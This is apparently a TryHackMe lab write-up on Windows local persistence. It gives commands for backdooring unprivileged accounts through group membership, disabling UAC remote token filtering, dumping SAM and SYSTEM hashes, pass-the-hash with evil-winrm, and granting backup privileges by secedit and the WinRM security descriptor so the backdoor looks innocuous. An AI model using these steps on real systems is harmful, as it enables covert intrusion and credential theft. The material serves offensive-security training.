# Windows Local Persistence

**Room Link:** [https://tryhackme.com/room/windowslocalpersistence](https://tryhackme.com/room/windowslocalpersistence)



## Tampering With Unprivileged Accounts

### Assign Group Memberships

For this part of the task, we will assume you have dumped the password hashes of the victim machine and successfully cracked the passwords for the unprivileged accounts in use.

The direct way to make an unprivileged user gain administrative privileges is to make it part of the **Administrators** group. We can easily achieve this with the following command.

**Victim(cmd)**

```
net localgroup administrators thmuser0 /add
```

This will allow you to access the server by using RDP, WinRM or any other remote administration service available.

If this looks too suspicious, you can use the **Backup Operators** group. Users in this group won't have administrative privileges but will be allowed to read/write any file or registry key on the system, ignoring any configured DACL. This would allow us to copy the content of the SAM and SYSTEM registry hives, which we can then use to recover the password hashes for all the users, enabling us to escalate to any administrative account trivially.

To do so, we begin by adding the account to the Backup Operators group.

**Victim(cmd)**

```
net localgroup "Backup Operators" thmuser1 /add
```

Since this is an unprivileged account, it cannot RDP or WinRM back to the machine unless we add it to the **Remote Desktop Users** (RDP) or **Remote Management Users** (WinRM) groups. We'll use WinRM for this task.

**Victim(cmd)**

```
net localgroup "Remote Management Users" thmuser1 /add
```

We'll assume we have already dumped the credentials on the server and have thmuser1's password. Let's connect via WinRM using its credentials. If you tried to connect right now from your attacker machine, you'd be surprised to see that even if you are on the Backups Operators group, you wouldn't be able to access all files as expected. A quick check on our assigned groups would indicate that we are a part of Backup Operators, but the group is disabled.

**Kali**

```
evil-winrm -i $VICTIM -u thmuser1 -p Password321
*Evil-WinRM* PS C:\Users\thmuser1\Documents> whoami /groups
```

<figure><img src="../../.gitbook/assets/image (1) (4).png" alt=""><figcaption></figcaption></figure>

This is due to User Account Control (UAC). One of the features implemented by UAC, **LocalAccountTokenFilterPolicy**, strips any local account of its administrative privileges when logging in remotely. While you can elevate your privileges through UAC from a graphical user session (Read more on UAC [here](https://tryhackme.com/room/windowsfundamentals1xbx)), if you are using WinRM, you are confined to a limited access token with no administrative privileges.

To be able to regain administration privileges from your user, we'll have to disable LocalAccountTokenFilterPolicy by changing the following registry key to 1.

**Victim**

```
reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /t REG_DWORD /v LocalAccountTokenFilterPolicy /d 1
```

Once all of this has been set up, we are ready to use our backdoor user. First, let's establish a WinRM connection and check that the Backup Operators group is enabled for our user:

**Kali**

```
evil-winrm -i $VICTIM -u thmuser1 -p Password321
*Evil-WinRM* PS C:\Users\thmuser1\Documents> whoami /groups
```

<figure><img src="../../.gitbook/assets/image (5).png" alt=""><figcaption></figcaption></figure>

\----

We then proceed to make a backup of SAM and SYSTEM files and download them to our attacker machine.

**Kali(WinRM)**

```
reg save hklm\system system.bak
reg save hklm\sam sam.bak
download system.bak
download sam.bak
```

With those files, we can dump the password hashes for all users using `secretsdump.py` or other similar tools.

**Kali**

```
python3.9 /opt/impacket/examples/secretsdump.py -sam sam.bak -system system.bak LOCAL
```

<figure><img src="../../.gitbook/assets/image (8).png" alt=""><figcaption></figcaption></figure>

And finally, perform Pass-the-Hash to connect to the victim machine with Administrator privileges.

**Kali**

```
evil-winrm -i $VICTIM -u Administrator -H f3118544a831e728781d780cfdb9c1fa
```

<figure><img src="../../.gitbook/assets/image (1).png" alt=""><figcaption></figcaption></figure>

### Special Privileges and Security Descriptors

A similar result to adding a user to the Backup Operators group can be achieved without modifying any group membership. Special groups are only special because the operating system assigns them specific privileges by default. **Privileges** are simply the capacity to do a task on the system itself. They include simple things like having the capabilities to shut down the server up to very privileged operations like being able to take ownership of any file on the system. A complete list of available privileges can be found [here](https://docs.microsoft.com/en-us/windows/win32/secauthz/privilege-constants) for reference.

In the case of the Backup Operators group, it has the following two privileges assigned by default:

* **SeBackupPrivilege:** The user can read any file in the system, ignoring any DACL in place.
* **SeRestorePrivilege:** The user can write any file in the system, ignoring any DACL in place.

We can assign such privileges to any user, independent of their group memberships. To do so, we can use the `secedit` command. First, we will export the current configuration to a temporary file. We open the file and add our user to the lines in the configuration regarding the SeBackupPrivilege and SeRestorePrivilege.

**Victim(cmd)**

<pre class="language-powershell"><code class="lang-powershell"><strong>secedit /export /cfg C:\Users\Administrator\Desktop\config.inf
</strong></code></pre>

<figure><img src="../../.gitbook/assets/image (94).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image.png" alt=""><figcaption></figcaption></figure>

We finally convert the .inf file into a .sdb file which is then used to load the configuration back into the system.

**Victim(cmd)**

```powershell
secedit /import /cfg  C:\Users\Administrator\Desktop\config.inf /db config.sdb

secedit /configure /db config.sdb /cfg  C:\Users\Administrator\Desktop\config.inf
```

You should now have a user with equivalent privileges to any Backup Operator. The user still can't log into the system via WinRM, so let's do something about it. Instead of adding the user to the Remote Management Users group, we'll change the security descriptor associated with the WinRM service to allow thmuser2 to connect. Think of a security descriptor as an ACL but applied to other system facilities.

To open the configuration window for WinRM's security descriptor, you can use the following command in Powershell (you'll need to use the GUI session for this).

```
powershell.exe
Set-PSSessionConfiguration -Name Microsoft.PowerShell -showSecurityDescriptorUI
```

This will open a window where you can add thmuser2 and assign it full privileges to connect to WinRM.

<figure><img src="../../.gitbook/assets/image (7).png" alt=""><figcaption></figcaption></figure>

Once we have done this, our user can connect via WinRM. Since the user has the SeBackup and SeRestore privileges, we can repeat the steps to recover the password hashes from the SAM and connect back with the Administrator user.

Notice that for this user to work with the given privileges fully, you'd have to change the **LocalAccountTokenFilterPolicy** registry key, but we've done this already to get the previous flag.

If you check your user's group memberships, it will look like a regular user. Nothing suspicious at all!





